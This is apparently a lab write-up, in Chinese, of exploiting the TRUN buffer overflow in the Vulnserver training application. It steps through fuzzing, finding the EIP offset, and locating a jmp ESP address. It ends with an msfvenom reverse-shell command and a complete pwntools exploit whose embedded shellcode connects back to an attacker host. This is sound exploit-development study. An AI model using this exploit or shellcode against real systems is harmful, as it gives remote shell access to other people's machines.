# Vulnserver (TRUN) Windows Overflow
## 事前準備
- Vulnserver
	- https://github.com/stephenbradshaw/vulnserver
	- 這邊我的環境是開在 `Microsoft Windows 10 專業版 10.0.19042` (沒有用 VM)
	- 關閉 Windows Defender
- Immunity Debugger
	- 安裝 Moma 的 Script
		- 把 `moma.py` 直接丟進 `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands` 即可
- Kali
	- 安裝 pwntools
	- 其他都有內建

## 簡介指令
- cyclic
	- pwntools 功能 (我覺得用起來比較順手)
		- `pwn cyclic`
			- 或是在 python 裡面的 `pwn.cyclic()`
			- 可以產出 cyclic 字串
			- ![](https://i.imgur.com/OzecgUw.png)
		- `pwn cyclic -l {Pattern in hex}`
			- 隨便取 4 個值，都能知道他 offset 第幾格
			- ![](https://i.imgur.com/ILy486S.png)
	- msf 功能
		- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}`
			- 產出長度為 length 的字串
		- `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {length} -q {pattern}`
			- ![](https://i.imgur.com/8MlUt3J.png)
- Fuzz 腳本
	- `generic_send_tcp {IP} {Port} {腳本.spk} 0 0`
	```C
	s_readline();
	s_string("{command}"); // 開頭要輸入的東西
	s_string_variable("0");
	```

## 觀察
- 第一步，nc 上去觀察
	- ![](https://i.imgur.com/N3hbhOM.png)
- 這次要打ㄉ洞是 TRUN
	- 基本指令是 `TRUN {something}`
	- ![](https://i.imgur.com/hx8bRe7.png)
## Fuzz
- 所以寫 TRUN 的 generic_send_tcp 的 Script `trun1.spk`
```C
s_readline();
s_string("TRUN "); // 開頭要輸入的東西
s_string_variable("0");
```
- 執行
	- `generic_send_tcp 192.168.1.102 9999 trun1.spk 0 0`
	- ![](https://i.imgur.com/KOACrib.png)
- Run 下去隔了幾秒鐘， Debugger 就跳卡住了
	- ![](https://i.imgur.com/FlAKrgn.png)
	- 下面有寫是 `0x41414141` 位子錯誤
	- 然後可以發現 `EIP` 也被變成了 `0x41414141`
	- `0x41` 是 `A`
- 觀察 EAX 
	- 發現 Command 的開頭是 `TRUN /.:/AAA....`
	- 只是我們不知道 Fuzz 有戳幾個 `A`
	- 但確定他的開頭是 `TRUN /.:/`
## Cyclic 找 Offset
- 用 cyclic 找 offset
	```python
	from pwn import *

	r = remote("192.168.1.102",9999)
	command = b"TRUN /.:/"
	cyclic_code = cyclic()

	payload = command + cyclic_code

	r.sendline(payload)
	```
- 觀察 EIP
	- ![](https://i.imgur.com/nOxDvWA.png)
	- 值為 0x61616275
- 輸入 `pwn cyclic -l 0x61616275 `
	- ![](https://i.imgur.com/QnQ0l5m.png)
	- 就能知道 offset 是 `2003`
- 測試 Offset 是否正確
	- 這邊用 `0xdeadbeef` 進行測試
	```python
	from pwn import *

	r = remote("192.168.1.102",9999)
	command = b"TRUN /.:/"
	padding = b'a'*2003
	meow = p32(0xdeadbeef)

	payload = command + padding + meow

	r.sendline(payload)
	```
	- 發現可以成功蓋到 EIP 了
	- ![](https://i.imgur.com/6eLQLUz.png)
## 觀察蓋完 EIP 後
- 觀察蓋完 EIP 後的東東
	```python
	from pwn import *

	r = remote("192.168.1.102",9999)
	command = b"TRUN /.:/"
	padding = b'a'*2003
	new_eip = p32(0xdeadbeef)
	padding2 = cyclic()

	payload = command + padding + new_eip + padding2

	r.sendline(payload)
	```
- 一樣用 cyclic
	- ![](https://i.imgur.com/tJc4O2t.png)
	- 會發現 ESP 指向 `aaaa`
	- 也就是 `0x61616161`
	- ![](https://i.imgur.com/aVw8GwN.png)
	- 就是說，我們的 address 後面直接接的東西會被 EIP 所指到
## 找 Shell Code 跳躍點
- 理論上我們在目前寫的後面 shell_code
	- 並且把 new_eip 設定為 `jmp ESP` 即可
- 在 immunity debugger 下面輸入
	- `!mona jmp -r esp` 可以找到 `jmp ESP` 的指令
		- ![](https://i.imgur.com/dgL01fP.png)
		- 第一個在 `0x625011af`
- 所以我們把 EIP 蓋成這個，他接下來就會跳去 EIP 指到的 Memory
	- 並且執行我們的 Shell Code
## 生 Reverse shell
- 接著要想辦法生成 reverse shell 的 shell code
- 這邊可以直接用 `msfvenom` 處理
	- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=7877 EXITFUNC=thread -f c -a x86 -b "\x00"`
	- ![](https://i.imgur.com/Ebkz3zb.png)
- 整理一下貼到 Python
- 再在前面增加幾個 nop (0x90)做 padding
	- 避免直接跳出現一些問題
	- Padding 長度以 32bit 的倍數為原則
	- `padding2 = p32(0x90909090) * 10`
## 完整 Exploit
```python
from pwn import *

r = remote("192.168.1.102",9999)
command = b"TRUN /.:/"
padding = b'a'*2003
new_eip = p32(0x625011af)
padding2 = p32(0x90909090) * 10
shellcode = (b"\xbe\xb0\x17\xe4\xba\xda\xcc\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
b"\x52\x31\x70\x12\x03\x70\x12\x83\x70\x13\x06\x4f\x8c\xf4\x44"
b"\xb0\x6c\x05\x29\x38\x89\x34\x69\x5e\xda\x67\x59\x14\x8e\x8b"
b"\x12\x78\x3a\x1f\x56\x55\x4d\xa8\xdd\x83\x60\x29\x4d\xf7\xe3"
b"\xa9\x8c\x24\xc3\x90\x5e\x39\x02\xd4\x83\xb0\x56\x8d\xc8\x67"
b"\x46\xba\x85\xbb\xed\xf0\x08\xbc\x12\x40\x2a\xed\x85\xda\x75"
b"\x2d\x24\x0e\x0e\x64\x3e\x53\x2b\x3e\xb5\xa7\xc7\xc1\x1f\xf6"
b"\x28\x6d\x5e\x36\xdb\x6f\xa7\xf1\x04\x1a\xd1\x01\xb8\x1d\x26"
b"\x7b\x66\xab\xbc\xdb\xed\x0b\x18\xdd\x22\xcd\xeb\xd1\x8f\x99"
b"\xb3\xf5\x0e\x4d\xc8\x02\x9a\x70\x1e\x83\xd8\x56\xba\xcf\xbb"
b"\xf7\x9b\xb5\x6a\x07\xfb\x15\xd2\xad\x70\xbb\x07\xdc\xdb\xd4"
b"\xe4\xed\xe3\x24\x63\x65\x90\x16\x2c\xdd\x3e\x1b\xa5\xfb\xb9"
b"\x5c\x9c\xbc\x55\xa3\x1f\xbd\x7c\x60\x4b\xed\x16\x41\xf4\x66"
b"\xe6\x6e\x21\x28\xb6\xc0\x9a\x89\x66\xa1\x4a\x62\x6c\x2e\xb4"
b"\x92\x8f\xe4\xdd\x39\x6a\x6f\x22\x15\x75\x05\xca\x64\x75\xc7"
b"\xcf\xe0\x93\x9d\xdf\xa4\x0c\x0a\x79\xed\xc6\xab\x86\x3b\xa3"
b"\xec\x0d\xc8\x54\xa2\xe5\xa5\x46\x53\x06\xf0\x34\xf2\x19\x2e"
b"\x50\x98\x88\xb5\xa0\xd7\xb0\x61\xf7\xb0\x07\x78\x9d\x2c\x31"
b"\xd2\x83\xac\xa7\x1d\x07\x6b\x14\xa3\x86\xfe\x20\x87\x98\xc6"
b"\xa9\x83\xcc\x96\xff\x5d\xba\x50\x56\x2c\x14\x0b\x05\xe6\xf0"
b"\xca\x65\x39\x86\xd2\xa3\xcf\x66\x62\x1a\x96\x99\x4b\xca\x1e"
b"\xe2\xb1\x6a\xe0\x39\x72\x8a\x03\xeb\x8f\x23\x9a\x7e\x32\x2e"
b"\x1d\x55\x71\x57\x9e\x5f\x0a\xac\xbe\x2a\x0f\xe8\x78\xc7\x7d"
b"\x61\xed\xe7\xd2\x82\x24")

payload = command + padding + new_eip + padding2 + shellcode

r.sendline(payload)
```
- 本地端開 nc 接 Shell
	- ![](https://i.imgur.com/DFp6IBy.png)
- 成功!!

## 參考資料
- https://www.hackercat.org/oscp/buffer-overflows-made-easy-notes-oscp-preparation
- https://www.youtube.com/watch?v=o-1qYzAqM_Q
